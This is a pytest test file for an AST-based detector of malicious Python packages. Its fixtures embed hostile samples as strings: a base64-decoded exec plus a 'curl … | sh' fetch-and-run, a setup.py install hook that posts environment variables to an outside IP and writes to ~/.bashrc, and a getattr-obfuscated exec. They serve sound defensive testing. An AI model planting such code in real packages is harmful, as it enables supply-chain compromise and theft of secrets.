"""Unit tests for the AST detection layer (built-in extractor + AST Master wrapper)."""

from __future__ import annotations

import os

import pytest

pytest.importorskip("ast_detection", reason="AST detection sources not present in this image")

from ast_detection.analyzer import PackageAnalyzer, astmaster_feature_names, feature_digest  # noqa: E402
from ast_detection.extractors import extract_file_features, shannon_entropy  # noqa: E402
from ast_detection.parser import AstMasterParser, discover_astmaster  # noqa: E402

BACKDOOR = '''import base64 as b
from os import system
exec(b.b64decode("aW1wb3J0IG9zO29zLnN5c3RlbSgiaWQiKQ=="))
system("curl http://203.0.113.5/x | sh")
'''


def test_dynamic_exec_and_aliases_detected() -> None:
    v = extract_file_features("pkg/__init__.py", BACKDOOR).values
    assert v["exec_calls"] == 1
    assert v["exec_of_decoded"] == 1
    assert v["decode_calls"] == 1
    assert v["process_calls"] == 1          # `from os import system` resolved to os.system
    assert v["module_level_dangerous"] == 2  # both run at import time
    assert v["ip_url_literals"] == 1


def test_dunder_import_reflection_and_obfuscation() -> None:
    src = 'getattr(__builtins__, "ex" + "ec")(__import__("zlib").decompress(b"x"))\nk = "abc"[::-1]\n'
    v = extract_file_features("m.py", src).values
    assert v["dynamic_imports"] == 1
    assert v["reflection_calls"] == 1
    assert v["string_concat_ops"] == 1
    assert v["string_reversals"] == 1


def test_network_file_write_env_and_install_hooks() -> None:
    src = '''import os, urllib.request
from setuptools import setup
from setuptools.command.install import install
class Hook(install):
    def run(self):
        urllib.request.urlopen("http://192.0.2.1", data=str(os.environ).encode())
        open(os.path.expanduser("~/.bashrc"), "a").write("x")
setup(name="x", cmdclass={"install": Hook})
'''
    f = extract_file_features("setup.py", src)
    v = f.values
    assert f.is_install
    assert v["install_hook_classes"] == 1 and v["cmdclass_keywords"] == 1
    assert v["network_calls"] == 1 and v["file_write_calls"] == 1 and v["env_access"] >= 1
    assert v["sensitive_path_literals"] == 1
    assert v["module_level_dangerous"] == 0  # inside run(): install-time, not import-time


def test_function_level_calls_are_not_module_level() -> None:
    v = extract_file_features("m.py", "import os\ndef f():\n    os.system('ls')\n").values
    assert v["process_calls"] == 1 and v["module_level_dangerous"] == 0


def test_unparseable_source_is_flagged_not_raised() -> None:
    assert extract_file_features("bad.py", "def (:\n").values["parse_error"] == 1


def test_entropy() -> None:
    assert shannon_entropy("aaaa") == 0
    assert shannon_entropy("abcd") == pytest.approx(2.0)


def test_astmaster_discovered_and_loaded() -> None:
    if os.environ.get("EXPECT_ASTMASTER") == "0":
        pytest.skip("astmaster intentionally absent")
    assert discover_astmaster() is not None, "local AST Master not found (set ASTMASTER_PATH)"
    parser = AstMasterParser(required=True)
    assert parser.available and parser.rules_version and "exec-decoded" in parser.rule_names


def test_missing_astmaster_degrades_gracefully(tmp_path) -> None:
    parser = AstMasterParser(root=tmp_path)  # empty dir: import fails
    assert not parser.available
    result = PackageAnalyzer(parser).analyze("x", {"setup.py": BACKDOOR})
    assert result["static_risk"]["source"] == "builtin"
    assert result["static_risk"]["score"] > 0.5
    assert result["features"]["am_available"] == 0


def test_analyzer_contract_and_verdicts(samples_dir) -> None:
    from ai_engine.data.loader import load_package_dir

    analyzer = PackageAnalyzer()
    if not analyzer.parser.available:
        pytest.skip("astmaster unavailable")
    mal = load_package_dir(samples_dir / "malicious_backdoor")
    ben = load_package_dir(samples_dir / "benign_pkg")
    r_mal = analyzer.analyze(mal["name"], mal["files"])
    r_ben = analyzer.analyze(ben["name"], ben["files"])
    assert r_mal["static_risk"]["verdict"] == "MALICIOUS"
    assert r_ben["static_risk"]["verdict"] == "SAFE"
    assert {f["rule"] for f in r_mal["findings"]} >= {"exec-decoded"}
    for r in (r_mal, r_ben):
        assert set(astmaster_feature_names()) <= set(r["features"])
        assert r["feature_digest"] == feature_digest(r["features"])


# --------------------------------------------------------------------------- #
# Risky-node evidence (what the dashboard highlights)
# --------------------------------------------------------------------------- #
def test_risky_nodes_located_with_severity() -> None:
    f = extract_file_features("pkg/__init__.py", BACKDOOR)
    by_line = {}
    for n in f.nodes:
        by_line.setdefault(n.line, []).append(n)
    exec_node = next(n for n in by_line[3] if "exec" in n.categories)
    assert exec_node.severity == "critical" and "exec_of_decoded" in exec_node.categories
    assert exec_node.node == "Call" and exec_node.module_level
    assert any(n.name == "os.system" and n.severity == "high" for n in by_line[4])


def test_disguised_exec_via_getattr_is_exec() -> None:
    src = 'import base64\ngetattr(__builtins__, "ex" + "ec")(base64.b64decode("cHJpbnQoMSk="))\n'
    f = extract_file_features("m.py", src)
    assert f.values["exec_calls"] == 1 and f.values["exec_of_decoded"] == 1
    assert any(n.name == "builtins.exec" and n.severity == "critical" for n in f.nodes)


def test_dynamic_import_flagged_as_node() -> None:
    f = extract_file_features("m.py", 'mod = __import__("os")\n')
    assert [n.categories for n in f.nodes] == [["dynamic_import"]]
    assert f.nodes[0].severity == "high"  # import-time


def test_benign_code_has_no_high_severity_nodes(samples_dir) -> None:
    from ai_engine.data.loader import load_package_dir

    pkg = load_package_dir(samples_dir / "benign_pkg")
    nodes = PackageAnalyzer().analyze(pkg["name"], pkg["files"])["risky_nodes"]
    assert all(n["severity"] == "low" for n in nodes), nodes


@pytest.mark.parametrize("sample, expected", [
    ("benign_pkg", "SAFE"), ("malicious_backdoor", "MALICIOUS"), ("typosquat_reqeusts", "MALICIOUS"),
])
def test_static_verdicts_on_samples(samples_dir, sample: str, expected: str) -> None:
    from ai_engine.data.loader import load_package_dir

    analyzer = PackageAnalyzer()
    if not analyzer.parser.available:
        pytest.skip("astmaster unavailable")
    pkg = load_package_dir(samples_dir / sample)
    assert analyzer.analyze(pkg["name"], pkg["files"])["static_risk"]["verdict"] == expected


def test_synthetic_corpus_static_accuracy() -> None:
    """AST layer accuracy over generated payloads: every attack is flagged, plain benign code is SAFE."""
    from ai_engine.data.generator import PackageGeneratorConfig, SyntheticPackageGenerator

    analyzer = PackageAnalyzer()
    if not analyzer.parser.available:
        pytest.skip("astmaster unavailable")
    pkgs = SyntheticPackageGenerator(PackageGeneratorConfig(n_benign=120, seed=3)).generate()
    verdicts = [(p, analyzer.analyze(p["name"], p["files"])["static_risk"]["verdict"]) for p in pkgs]
    attacks = [v for p, v in verdicts if p["is_malicious"]]
    benign = [v for p, v in verdicts if not p["is_malicious"]]
    assert all(v != "SAFE" for v in attacks)
    assert sum(v == "SAFE" for v in benign) / len(benign) > 0.9
